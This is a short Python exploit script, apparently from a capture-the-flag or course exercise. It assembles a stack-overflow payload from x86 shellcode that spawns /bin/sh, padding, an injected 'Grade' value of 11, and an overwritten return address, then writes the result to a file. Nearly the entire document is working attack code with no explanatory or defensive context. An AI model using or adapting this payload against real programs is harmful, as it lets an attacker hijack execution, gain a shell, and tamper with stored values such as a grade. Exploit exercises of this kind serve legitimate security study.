import sys
import struct

# --- Configuration ---
target_address = 0x080ef320  # Address of Name
total_offset = 52            # Distance to Return Address

# --- Shellcode (25 bytes) ---
shellcode = (
    b"\x31\xc0\x31\xd2\x50\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89"
    b"\xe1\xb0\x0b\xcd\x80"
)

# --- Constructing the Payload with Grade 11 ---

# Shellcode (Bytes 0-24)
payload = shellcode

# Padding to reach Grade (Bytes 25-31)
# Grade is at offset 32.
padding_to_grade = b"A" * (32 - len(shellcode))
payload += padding_to_grade

# Inject Grade = 11 (Bytes 32-35)
payload += struct.pack("<I", 11)

# Fill the rest until Return Address (Bytes 36-51)
# We need to reach offset 52.
padding_after_grade = b"B" * (total_offset - len(payload))
payload += padding_after_grade

# Add Return Address (Bytes 52-55)
payload += struct.pack("<I", target_address)


try:
    with open("payload", "wb") as f:
        f.write(payload)
    #print("Success: 'payload' file created.")
except IOError as e:
    print(f"Error writing to file: {e}")